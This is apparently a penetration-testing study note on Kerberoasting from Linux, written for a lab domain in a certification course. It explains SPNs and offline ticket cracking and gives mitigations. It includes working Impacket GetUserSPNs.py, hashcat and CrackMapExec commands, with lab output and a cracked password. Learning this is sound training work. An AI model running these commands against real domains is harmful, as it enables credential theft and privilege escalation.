# 🔥 Kerberoasting — from Linux

> [!info] 🎯 What this section is teaching  
> **Kerberoasting is an Active Directory attack against user accounts that have Service Principal Names (SPNs).**
> 
> The core idea is:
> 
> **Find SPN → request TGS → extract crackable TGS-REP → crack offline → recover service-account password → authenticate as that account → use its privileges to move laterally / escalate.**
> 
> The important mental model is that **Kerberoasting does not directly compromise the service**. It gives us material that may allow us to recover the **service account's password**.

---

## 🧭 1. CPTS Methodology Position

```text
Credentialed Enumeration
        │
        ▼
Find users + groups + SPNs
        │
        ▼
Identify interesting SPN accounts
        │
        ▼
Request TGS ticket
        │
        ▼
Extract TGS-REP hash
        │
        ▼
Offline password cracking
        │
        ├── ❌ Not cracked → try other targets / techniques
        │
        └── ✅ Cracked
                │
                ▼
        Valid service-account password
                │
                ▼
        Determine privileges
                │
        ├── Low privilege → continue enumeration / lateral movement
        │
        └── High privilege → possible privilege escalation / domain compromise
```

> [!important] 🧠 The key distinction  
> **SPN ≠ vulnerability by itself.**
> 
> An SPN simply identifies a service instance for Kerberos.
> 
> The security problem is that when a service runs under a **domain user account**, an authenticated domain user can request a TGS for that account. The resulting ticket can then be attacked **offline** against the service account's password.

---

# 📋 2. Command Cheat Sheet

|Command|Purpose|
|---|---|
|`sudo python3 -m pip install .`|Install Impacket from the cloned repository|
|`GetUserSPNs.py -h`|Display GetUserSPNs.py help|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`|Enumerate SPN-associated user accounts|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`|Request TGS tickets for discovered SPN accounts|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`|Request a TGS for one specific SPN account|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`|Save the requested TGS ticket to a file|
|`hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt`|Offline crack Kerberos 5 TGS-REP etype 23|
|`sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!`|Test recovered credentials against SMB|
|`$krb5tgs$23$...`|Hashcat-compatible Kerberos TGS-REP format|
|`-request`|Request tickets for all discovered SPN accounts|
|`-request-user <username>`|Request a ticket for one specific account|
|`-outputfile <file>`|Save extracted TGS hashes to a file|
|`-dc-ip <IP>`|Specify the Domain Controller to query|
|`-m 13100`|Hashcat mode for Kerberos 5 TGS-REP, etype 23|

---

# 🛠️ 3. Tool Roles & Differences

> [!important] Why this section matters  
> Several tools appear in this attack, but they perform **different jobs**. Do not think of `GetUserSPNs.py`, Hashcat, and CrackMapExec as competing tools.

|Tool|Primary role|Where it fits|
|---|---|---|
|[Impacket](https://github.com/fortra/impacket) `GetUserSPNs.py`|Enumerates SPNs and requests TGS tickets|**Discovery + ticket extraction**|
|[Hashcat](https://hashcat.net/hashcat/)|Cracks the extracted TGS material offline|**Credential recovery**|
|[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)|Tests recovered credentials against network services|**Credential validation / lateral movement**|
|`setspn.exe`|Native Windows SPN querying/management|**Windows-side SPN enumeration**|
|PowerShell|Provides scripting and Windows/AD interaction|**Windows-side enumeration/automation**|
|[Rubeus](https://github.com/GhostPack/Rubeus)|Kerberos interaction from Windows|**Windows-side Kerberos operations**|
|PowerView|PowerShell-based AD enumeration|**Windows-side AD enumeration**|
|BloodHound|Maps relationships and attack paths|**Analysis / path discovery**|

### 🔄 Complementary vs Alternative

```text
                    Kerberoasting Workflow
                           │
                           ▼
                    GetUserSPNs.py
                           │
                    Find SPNs / TGS
                           │
                           ▼
                       Hashcat
                           │
                    Recover password
                           │
                           ▼
                  Credential validation
                           │
                           ▼
                 CrackMapExec / SMB
```

**GetUserSPNs → Hashcat → credential validation**

These are **complementary**, not alternatives.

On Windows, tools such as **Rubeus / PowerView / setspn.exe** can perform overlapping parts of the discovery/Kerberos workflow.

---

# 🔑 4. What Is an SPN?

An **SPN — Service Principal Name** — is a unique identifier that Kerberos uses to associate a service instance with the account under which that service runs.

Official Microsoft documentation: [Service Principal Names](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names)

A simplified example:

```text
MSSQLSvc/SQL01.inlanefreight.local:1433
        │
        ├── Service: MSSQLSvc
        ├── Host: SQL01.inlanefreight.local
        └── Port: 1433
```

The SPN tells Kerberos:

> "This particular service instance is associated with this account."

If that service is configured to run under a **domain user account**, the account can become a Kerberoasting target.

---

# 🔥 5. What Is Kerberoasting?

Kerberoasting is an Active Directory technique that abuses the normal Kerberos service-ticket process.

A simplified view:

```text
Domain User
    │
    │  "I need a ticket for this SPN"
    ▼
Domain Controller / KDC
    │
    │  TGS-REP
    ▼
Service Ticket
    │
    │ encrypted using key derived from
    │ service account's password
    ▼
Offline cracking
    │
    ▼
Potential plaintext password
```

The important part is that the attacker does **not** need to know the service account's password to request the service ticket.

They only need sufficient access to request the ticket as an authenticated domain principal.

---

# 🧠 6. Why Does the Attack Work?

Kerberos normally needs to provide a service with a ticket that it can decrypt.

For a service account:

```text
Service Account Password
          │
          ▼
   Cryptographic Key
          │
          ▼
      TGS-REP
          │
          ▼
     Service Ticket
```

The attacker obtains the TGS and takes the relevant crackable representation offline.

The attacker can then try password guesses:

```text
Candidate password
        │
        ▼
Derive candidate key
        │
        ▼
Compare against TGS material
        │
        ├── ❌ mismatch
        │
        └── ✅ match
                │
                ▼
       Service account password
```

> [!important] 🔐 Offline is the important word  
> The password guessing happens **after the ticket has been obtained**.
> 
> The attacker is not repeatedly authenticating against the Domain Controller while guessing passwords.
> 
> This is why Kerberoasting is fundamentally different from password spraying or online brute force.

---

# ⚠️ 7. What Access Do We Need?

The source identifies several possible starting positions.

|Starting position|Can perform Kerberoasting?|
|---|---|
|Non-domain-joined Linux + valid domain credentials|✅|
|Domain-joined Linux + root + keytab|✅|
|Domain-joined Windows + authenticated domain user|✅|
|Domain-joined Windows + domain-account shell|✅|
|Domain-joined Windows + SYSTEM|✅|
|Non-domain-joined Windows + `runas /netonly`|✅|

For the Linux workflow in this section, the important prerequisite is:

> **Valid domain-user credentials + access to a Domain Controller.**

The credentials can be:

- Cleartext password
    
- NTLM hash when using compatible Impacket authentication
    
- Kerberos authentication material/ticket
    

---

# 🧩 8. Why Service Accounts Are Interesting

This is where Kerberoasting becomes potentially valuable.

Service accounts frequently need permissions to perform their jobs.

For example:

```text
SQL Service Account
       │
       ├── SQL Server 01
       ├── SQL Server 02
       ├── SQL Server 03
       └── File Server
```

A service account may therefore have privileges on multiple systems.

In badly configured environments, a service account may even have highly privileged domain membership:

```text
Service Account
      │
      ▼
Nested Group
      │
      ▼
Domain Admins
```

Or directly:

```text
Service Account ─────────► Domain Admins
```

Therefore, after discovering an SPN, **do not only look at the SPN itself**.

Also investigate:

- Account name
    
- Group membership
    
- Privileges
    
- Password age
    
- Service type
    
- Host running the service
    
- Whether the account is reused elsewhere
    
- Whether the account is privileged
    

---

# 🎯 9. Kerberoasting Does NOT Give You Command Execution

This is one of the most important concepts.

Obtaining a TGS does **not** mean:

```text
TGS obtained
     ≠
Immediate shell
```

Instead:

```text
TGS obtained
      │
      ▼
Offline cracking
      │
      ├── ❌ Cannot crack
      │
      └── ✅ Password recovered
                │
                ▼
        Authenticate as account
                │
                ▼
        Determine privileges
                │
                ▼
        Use available access
```

> [!warning] ⚠️ Common misconception  
> **Kerberoasting is not "stealing a password from Kerberos."**
> 
> You obtain a service ticket and attempt to recover the underlying service-account password through offline password guessing.

---

# 💥 10. Example: MSSQL Service Account

Suppose enumeration finds:

```text
MSSQLSvc/SRV01.inlanefreight.local:1433
```

associated with:

```text
sqldev
```

If `sqldev` has high privileges and its password can be cracked:

```text
MSSQL SPN
    │
    ▼
Request TGS
    │
    ▼
Crack TGS
    │
    ▼
sqldev : recovered_password
    │
    ▼
Authenticate to SQL Server
    │
    ▼
Potential privileged SQL access
```

The source gives an example where MSSQL access could potentially allow `xp_cmdshell` to be enabled and lead to code execution.

> [!warning] Important distinction  
> **Cracking the password gives credentials.**
> 
> What you can actually do with those credentials depends on:
> 
> - group membership
>     
> - service permissions
>     
> - SQL permissions
>     
> - local administrator rights
>     
> - domain privileges
>     
> - network access
>     
> - security controls
>     

---

# 📊 11. Efficacy of the Attack

Kerberoasting is **not guaranteed to produce useful credentials**.

There are several possible outcomes:

|Result|Meaning|
|---|---|
|TGS obtained + privileged password cracked|Potential major privilege escalation|
|TGS obtained + low-privilege password cracked|Valid credential, but limited immediate impact|
|Many TGS tickets obtained + none cracked|No credential recovery|
|Strong service-account passwords|Offline cracking may be impractical|
|Reused/weak service-account password|Potentially high impact|

### 🧠 CPTS Reporting Mental Model

Do not automatically think:

```text
SPN found = Domain compromise
```

Think:

```text
SPN
 │
 ▼
TGS obtained
 │
 ▼
Can password be cracked?
 │
 ├── NO ──► Finding still exists, but impact is limited by current evidence
 │
 └── YES
       │
       ▼
   What privileges?
       │
       ├── Low privilege
       │
       └── High privilege
```

> [!important] Reporting  
> The source emphasizes that the **actual demonstrated impact** matters.
> 
> A Kerberoasting finding where no ticket can be cracked is different from one where a Domain Admin service account's password is recovered.
> 
> Risk should reflect the evidence obtained during the assessment and the effectiveness of mitigating controls such as strong service-account passwords.

---

# 🐧 12. Kerberoasting from Linux

The workflow in this section uses:

**[Impacket](https://github.com/fortra/impacket) → `GetUserSPNs.py` → Hashcat**

The stages are:

```text
1. Obtain domain credentials
        ↓
2. Identify Domain Controller
        ↓
3. Query domain for SPNs
        ↓
4. Identify interesting accounts
        ↓
5. Request TGS
        ↓
6. Save TGS hash
        ↓
7. Crack offline
        ↓
8. Validate recovered credentials
        ↓
9. Enumerate privileges / continue attack path
```

---

# 📦 13. Installing Impacket

The source installs the toolkit from its repository:

```bash
sudo python3 -m pip install .
```

This installs the Impacket tools so they can be called from the command line.

> [!info] CPTS  
> On the HTB attack host, Impacket is already installed. The installation step is useful to understand when working from your own Kali environment.

### Installation Output

```text
k33lwa@htb[/htb]$ sudo python3 -m pip install .

Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (4.0.0)
Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (1.1.2)
Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.18.2)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (2.8.1)
Requirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.9.3)

<SNIP>
```

---

# 🔎 14. `GetUserSPNs.py`

`GetUserSPNs.py` is an Impacket example script designed to query a domain for SPNs associated with **user accounts**.

### Help

```bash
GetUserSPNs.py -h
```

Important options from the source:

|Option|Meaning|
|---|---|
|`-dc-ip <IP>`|Domain Controller IP|
|`-request`|Request TGS tickets for discovered accounts|
|`-request-user <username>`|Request a ticket for one specific user|
|`-outputfile <file>`|Save extracted tickets|
|`-hashes LMHASH:NTHASH`|Authenticate using hashes|
|`-k`|Use Kerberos authentication|
|`-no-pass`|Do not prompt for a password|
|`-aesKey <key>`|Use an AES key|
|`-debug`|Enable debugging|
|`target`|`domain/username[:password]`|

### Source Help Output

```text
k33lwa@htb[/htb]$ GetUserSPNs.py -h

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN]
                      [-usersfile USERSFILE] [-request]
                      [-request-user username] [-save]
                      [-outputfile OUTPUTFILE] [-debug]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address]
                      target

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]

<SNIP>
```

---

# 🔍 15. Step 1 — Enumerate SPN Accounts

First, query the Domain Controller for accounts with SPNs.

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

You will be prompted for the password.

### Source Output

```text
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>
```

### 🧠 What Should We Look At?

Do not simply collect the SPN list.

Correlate:

```text
SPN
 │
 ├── Account
 │
 ├── Service
 │
 ├── Host
 │
 ├── Port
 │
 └── Group Membership
```

For example:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
                    │
                    ▼
                  sqldev
                    │
                    ▼
              Domain Admins
```

That account immediately becomes particularly interesting because the account's group membership determines the potential impact if its password is recovered.

---

# 🎫 16. Step 2 — Request TGS Tickets

Once we have identified SPN accounts, we can request their service tickets.

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

The `-request` option changes the workflow from:

```text
"Tell me which accounts have SPNs"
```

to:

```text
"Find the SPNs and request the corresponding service tickets"
```

The output contains TGS material in a format suitable for offline password cracking.

---

# 🧾 17. Understanding the `$krb5tgs$23$` Format

A Kerberoasting result may look like:

```text
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$...
```

Break it down conceptually:

```text
$krb5tgs$
    │
    └── Kerberos TGS hash format

23
│
└── Kerberos encryption type used by this hash
    (RC4-HMAC / etype 23)

sqldev
│
└── Service account

INLANEFREIGHT.LOCAL
│
└── Domain / realm
```

> [!important] 🔐 Hashcat does not receive the original TGS binary  
> `GetUserSPNs.py` produces a **cracking representation** of the ticket suitable for tools such as Hashcat.

---

# 🎯 18. Step 3 — Request Only One TGS

Requesting every ticket may be unnecessary.

If enumeration identifies a particularly interesting account, request only that account:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

Output:

```text
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>
```

Then the TGS is returned:

```text
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$...
```

### 🧠 Why target one account?

Because enumeration should be **target-driven**.

Instead of:

```text
Request everything
      ↓
Crack everything
```

you can do:

```text
Enumerate
   ↓
Prioritize
   ↓
Request interesting target
   ↓
Crack
```

This reduces unnecessary work and gives you a clearer assessment trail.

---

# 💾 19. Step 4 — Save the TGS to a File

Use:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

This writes the extracted TGS material to:

```text
sqldev_tgs
```

Now the cracking process is separated from ticket acquisition:

```text
Domain
  │
  ▼
GetUserSPNs.py
  │
  ▼
sqldev_tgs
  │
  ▼
Hashcat
```

> [!tip] 🧠 Methodology  
> Saving the ticket is useful because **ticket collection and password cracking are separate phases**.
> 
> You can collect the relevant material first and perform offline cracking later on a stronger GPU system.

---

# 💻 20. Step 5 — Crack the TGS Offline

The source uses Hashcat mode **13100**:

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### What does `-m 13100` mean?

```text
-m 13100
   │
   └── Hashcat mode
       Kerberos 5, etype 23, TGS-REP
```

The source successfully recovers:

```text
database!
```

Hashcat reports:

```text
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
...
Recovered........: 1/1 (100.00%) Digests
...
```

### 🧠 The critical transition

Before cracking:

```text
sqldev
   │
   └── SPN + TGS
```

After cracking:

```text
sqldev
   │
   └── password = database!
```

Now we have **actual credentials**, which can be tested against services.

---

# 🔐 21. Step 6 — Validate the Recovered Credentials

The source tests the credentials against the Domain Controller using SMB:

```bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

Output:

```text
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!
```

The `Pwn3d!` result in this lab indicates that the recovered account has administrative-level access over SMB to the target.

> [!important] 🧠 Why validate?  
> Cracking the password is not the end of the methodology.
> 
> We need to determine:
> 
> **"What can these credentials actually access?"**
> 
> A recovered password can be:
> 
> ```text
> Valid + low privilege
> ```
> 
> or:
> 
> ```text
> Valid + local administrator
> ```
> 
> or:
> 
> ```text
> Valid + domain administrator
> ```
> 
> The impact depends on the privileges and accessible services.

---

# 🧠 22. The Complete Kerberoasting Mental Model

```text
                 EXISTING FOOTHOLD
                        │
                        ▼
              Valid Domain User
                        │
                        ▼
             Enumerate AD Users
                        │
                        ▼
                Find SPN Accounts
                        │
                        ▼
             ┌───────────────────┐
             │ Is account useful?│
             └─────────┬─────────┘
                       │
              ┌────────┴────────┐
              │                 │
             NO                YES
              │                 │
              ▼                 ▼
        Deprioritize       Request TGS
                                │
                                ▼
                       Extract TGS hash
                                │
                                ▼
                         Offline crack
                                │
                    ┌───────────┴───────────┐
                    │                       │
                  FAIL                    SUCCESS
                    │                       │
                    ▼                       ▼
              Try another SPN        Recover password
                                            │
                                            ▼
                                    Validate credentials
                                            │
                                            ▼
                                     Enumerate privileges
                                            │
                               ┌────────────┴────────────┐
                               │                         │
                          Limited access          Privileged access
                               │                         │
                               ▼                         ▼
                       Lateral movement          Privilege escalation /
                       / further enum            domain compromise
```

---

# 🔬 23. What You Should Look For During SPN Enumeration

When `GetUserSPNs.py` returns results, don't just look for **any** SPN.

Prioritize based on multiple pieces of information:

|Field|Why it matters|
|---|---|
|`ServicePrincipalName`|Identifies the service and host|
|`Name`|Identifies the account running the service|
|`MemberOf`|Helps determine potential impact|
|`PasswordLastSet`|Provides password-age context|
|`LastLogon`|Helps understand account activity|
|`Delegation`|Indicates potentially interesting Kerberos delegation configuration|
|Service type|SQL, web, backup, monitoring, etc.|
|Host|Identifies where the service operates|

### Example

```text
SPN:
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433

Account:
sqldev

MemberOf:
Domain Admins
```

This is significantly more interesting than merely seeing:

```text
SPN:
some-service/server01
```

because the account's privileges determine the potential impact.

---

# 🧩 24. Kerberoasting vs Other Credential Attacks

|Technique|What you target|Main idea|
|---|---|---|
|**Kerberoasting**|SPN-associated service accounts|Request TGS → crack offline|
|**Password spraying**|Many accounts|Try a small number of passwords across accounts|
|**Brute force**|One/few accounts|Try many passwords against an authentication service|
|**AS-REP Roasting**|Accounts without Kerberos preauthentication|Request AS-REP material → crack offline|
|**Credential reuse**|Reused passwords|Use recovered credential against other systems|

> [!important] 🧠 Main difference  
> **Kerberoasting targets the Kerberos service-ticket mechanism and SPN-associated accounts.**
> 
> The password guessing happens **offline**, after obtaining the ticket.

---

# 🛡️ 25. Why Password Strength Matters So Much

Kerberoasting relies heavily on the strength of the service account's password.

Conceptually:

```text
Weak password
     │
     ▼
Fast offline guessing
     │
     ▼
Password recovered
```

versus:

```text
Long random password
     │
     ▼
Huge search space
     │
     ▼
Cracking becomes substantially harder
```

This is why service accounts should use:

- Long random passwords
    
- Unique passwords
    
- Managed service accounts where appropriate
    
- Least privilege
    
- No unnecessary Domain Admin membership
    

> [!warning] ⚠️ Do not interpret "SPN present" as "account is compromised"  
> An SPN is a normal part of Kerberos service configuration.
> 
> The security risk increases when the associated service account has:
> 
> - weak/reused credentials
>     
> - excessive privileges
>     
> - broad access
>     
> - unnecessary Domain Admin membership
>     

---

# 🧠 26. CPTS Methodology — How This Fits Your Attack Process

This is the important part to remember for the exam.

You previously learned to enumerate:

```text
Users
Groups
Computers
Services
SPNs
Trusts
Sessions
Network information
```

Kerberoasting is what happens when **SPN enumeration identifies an attackable service account**.

```text
AD Enumeration
      │
      ├── Users
      ├── Groups
      ├── Computers
      ├── Trusts
      └── SPNs
            │
            ▼
     SPN Account Found
            │
            ▼
    Check MemberOf / Privileges
            │
            ▼
       Request TGS
            │
            ▼
       Crack Offline
            │
            ▼
      New Credentials
            │
            ▼
      RETEST EVERYWHERE
```

> [!important] 🔁 CPTS rule: new credentials = new enumeration
> 
> If you recover:
> 
> ```text
> sqldev : database!
> ```
> 
> do **not** immediately assume the next step is "Domain Admin."
> 
> Treat it as a **new credential set**:
> 
> ```text
> New Credential
>       │
>       ├── SMB
>       ├── MSSQL
>       ├── WinRM
>       ├── RDP
>       ├── LDAP
>       ├── Other hosts
>       └── AD enumeration
> ```
> 
> Then determine where those credentials actually work and what privileges they provide.

---

# 🧪 27. Semi-Manual vs Automated Kerberoasting

The section introduces multiple ways of performing the attack.

### Linux

```text
GetUserSPNs.py
      │
      ├── Enumerate SPNs
      ├── Request TGS
      └── Export crackable material
                │
                ▼
             Hashcat
```

### Windows

Possible approaches include:

```text
setspn.exe
    +
PowerShell
    +
Mimikatz
```

or:

```text
PowerView
    +
Rubeus
```

The underlying attack remains the same:

```text
Identify SPN
    ↓
Request service ticket
    ↓
Obtain crackable ticket material
    ↓
Offline password cracking
```

The **tooling changes**, but the methodology does not.

---

# 📚 28. Important Concepts to Remember

## 🔹 SPN

A unique identifier used by Kerberos to associate a service instance with an account.

```text
Service → SPN → Account
```

---

## 🔹 Service Account

A domain account used to run a service.

Example:

```text
sqldev
   │
   └── MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

---

## 🔹 TGS

A **Ticket Granting Service ticket** for accessing a particular Kerberos service.

Kerberoasting abuses the ability of an authenticated domain principal to request service tickets for SPN-associated accounts.

---

## 🔹 TGS-REP

The Kerberos response containing the service ticket material that can be extracted into a cracking format.

---

## 🔹 Offline Cracking

Password guesses are tested against the captured ticket material rather than repeatedly sent to the Domain Controller.

---

## 🔹 `GetUserSPNs.py`

The Linux/Impacket tool used in this section to:

```text
Enumerate SPNs
       +
Request TGS tickets
       +
Extract crackable material
```

---

## 🔹 Hashcat `13100`

Hashcat mode used by the source for:

```text
Kerberos 5
etype 23
TGS-REP
```

---

# 🎯 29. Exam Memory Chain

Memorize this:

```text
SPN
 ↓
Service Account
 ↓
Request TGS
 ↓
TGS-REP
 ↓
Offline Crack
 ↓
Password
 ↓
Validate
 ↓
Privileges
 ↓
Retest
 ↓
Lateral Movement / Privilege Escalation
```

Or the ultra-short version:

> **SPN → TGS → Crack → Password → Privileges**

---

# 🏁 30. Key Takeaways

> [!success] 🔥 Kerberoasting — the essentials
> 
> - **SPNs identify services associated with accounts.**
>     
> - Domain users can request service tickets for SPN-associated accounts.
>     
> - A TGS can contain material that is useful for **offline password cracking**.
>     
> - `GetUserSPNs.py` is the main Linux tool used in this section.
>     
> - `-request` requests TGS tickets.
>     
> - `-request-user` targets one specific account.
>     
> - `-outputfile` saves the extracted material.
>     
> - Hashcat mode **13100** is used for Kerberos 5 TGS-REP etype 23 in the source.
>     
> - Successfully cracking the TGS gives the **service-account password**, not automatic code execution.
>     
> - Always check the recovered account's **group membership and privileges**.
>     
> - A privileged service account can turn a successful Kerberoast into major lateral movement or privilege escalation.
>     
> - A strong service-account password can make offline cracking impractical.
>     
> - **SPN presence alone does not mean compromise.**
>     
> - After obtaining new credentials, **re-enumerate and retest them everywhere relevant**.
>     
> 
> ### 🧠 CPTS mental model
> 
> **Enumeration finds the SPN → Kerberoasting obtains the TGS → Hashcat tests the password offline → recovered credentials open a new branch in the attack graph.**